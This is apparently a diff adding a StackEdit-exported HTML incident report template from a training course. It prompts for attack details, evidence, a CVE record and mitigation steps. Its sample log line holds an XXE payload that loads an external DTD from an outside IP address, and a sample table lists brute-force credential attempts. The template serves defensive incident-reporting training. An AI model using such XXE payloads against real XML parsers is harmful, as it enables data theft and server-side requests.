@@ -1,0 +1,167 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Template</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__left">
+    <div class="stackedit__toc">
+      
+<ul>
+<li><a href="#incident-report-x">Incident Report ‘X’</a>
+<ul>
+<li><a href="#contents">Contents</a></li>
+<li><a href="#vector-diagnosis">Vector Diagnosis</a></li>
+<li><a href="#attack-analysis">Attack Analysis</a></li>
+<li><a href="#visual-display">Visual Display</a></li>
+<li><a href="#signature--cve-details">Signature / CVE Details</a></li>
+<li><a href="#mitigation-steps">Mitigation Steps</a></li>
+<li><a href="#recovery-steps">Recovery Steps</a></li>
+<li><a href="#more-notes">More Notes</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="stackedit__right">
+    <div class="stackedit__html">
+      <h1 id="incident-report-x">Incident Report ‘X’</h1>
+<p>Reporter Name | Lighthouse Labs</p>
+<p>Date and time of attack:</p>
+<p>Attack vector:</p>
+<h2 id="contents">Contents</h2>
+<p>[TOC]</p>
+<h2 id="vector-diagnosis">Vector Diagnosis</h2>
+<ol>
+<li>
+<p>Name of the attack.</p>
+</li>
+<li>
+<p>Describe the attack in your language. What the attacker tried and if he was succcesful.</p>
+</li>
+</ol>
+<h2 id="attack-analysis">Attack Analysis</h2>
+<ol>
+<li>
+<p>Mention the section of the application which was compromised.</p>
+</li>
+<li>
+<p>Add the proof of the attack - e.g. URL in encoded as well as decoded format.</p>
+</li>
+</ol>
+<p><strong>Example of log within code block below</strong></p>
+<pre><code>158.52.23.93--[30/Sep/2020:07:49:26-0400]"GET/login.php?upload=&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://57.21.52.73:22/"&gt;%dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;HTTP/1.1"2003343"http://www.cybintnews.com/index.html?upload=&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://57.21.52.73:22/"&gt;%dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;""Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/85.0.4183.121Safari/537.36
+</code></pre>
+<p><strong>Example of Table below</strong></p>
+
+<table>
+<thead>
+<tr>
+<th>Usernames</th>
+<th align="center">Passwords</th>
+<th align="right">Attempts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>user1</td>
+<td align="center">password</td>
+<td align="right">1600</td>
+</tr>
+<tr>
+<td>user2</td>
+<td align="center">password123</td>
+<td align="right">12</td>
+</tr>
+<tr>
+<td>admin</td>
+<td align="center">noopassword</td>
+<td align="right">10</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>IP</th>
+<th>Method of attack</th>
+<th>Events</th>
+<th>URI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>127.0.0.1</td>
+<td>XXE</td>
+<td><strong>25</strong></td>
+<td><code>&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM</code></td>
+</tr>
+<tr>
+<td>localhost</td>
+<td>SQL Injection</td>
+<td>3</td>
+<td></td>
+</tr>
+</tbody>
+</table><h2 id="visual-display">Visual Display</h2>
+<ul>
+<li>Screenshot/Video showing the attack and how to find it.</li>
+</ul>
+<h2 id="signature--cve-details">Signature / CVE Details</h2>
+<p><strong>CVE Example Below</strong></p>
+<pre><code>CVE
+
+CVE-2022-21721
+
+Description
+
+Next.js is a React framework. Starting with version 12.0.0 and prior to version 12.0.9, vulnerable code could allow a bad actor to trigger a denial of service attack for anyone using i18n functionality. In order to be affected by this CVE, one must use next start or a custom server and the built-in i18n support. Deployments on Vercel, along with similar environments where invalid requests are filtered before reaching Next.js, are not affected. A patch has been released, `next@12.0.9`, that mitigates this issue. As a workaround, one may ensure `/${locale}/_next/` is blocked from reaching the Next.js instance until it becomes feasible to upgrade.
+
+  
+
+References
+
+CONFIRM:https://github.com/vercel/next.js/security/advisories/GHSA-wr66-vrwm-5g5x
+
+URL:https://github.com/vercel/next.js/security/advisories/GHSA-wr66-vrwm-5g5x
+
+MISC:https://github.com/vercel/next.js/pull/33503
+
+URL:https://github.com/vercel/next.js/pull/33503
+
+MISC:https://github.com/vercel/next.js/releases/tag/v12.0.9
+
+URL:https://github.com/vercel/next.js/releases/tag/v12.0.9
+
+  
+
+Assigning CNA
+
+GitHub (maintainer security advisories)
+
+Date Record Created
+
+20211116 Disclaimer: The record creation date may reflect when the CVE ID was allocated or reserved, and does not necessarily indicate when this vulnerability was discovered, shared with the affected vendor, publicly disclosed, or updated in CVE.
+
+Phase (Legacy)
+
+Assigned (20211116)
+</code></pre>
+<p>If possible Score the attack by using this tool - <a href="https://www.first.org/cvss/calculator/3.0">https://www.first.org/cvss/calculator/3.0</a></p>
+<h2 id="mitigation-steps">Mitigation Steps</h2>
+<p>How to recover your applications back to normal behaviour</p>
+<h2 id="recovery-steps">Recovery Steps</h2>
+<p>Back up plan in case of future attacks</p>
+<h2 id="more-notes">More Notes</h2>
+
+    </div>
+  </div>
+</body>
+
+</html>
